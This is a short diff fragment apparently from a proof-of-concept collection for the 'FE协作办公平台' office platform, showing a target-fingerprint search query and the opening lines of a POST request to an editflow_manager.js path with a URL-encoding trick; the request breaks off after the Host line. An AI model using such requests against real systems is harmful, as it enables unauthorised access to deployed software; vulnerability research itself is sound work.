@@ -6,7 +6,7 @@ title="FE协作办公平台" || body="li_plugins_download"
 ```
 
 
-## poc
+## POC
 ```
 POST /sysform/003/editflow_manager.js%70 HTTP/1.1
 Host: x.x.x.x
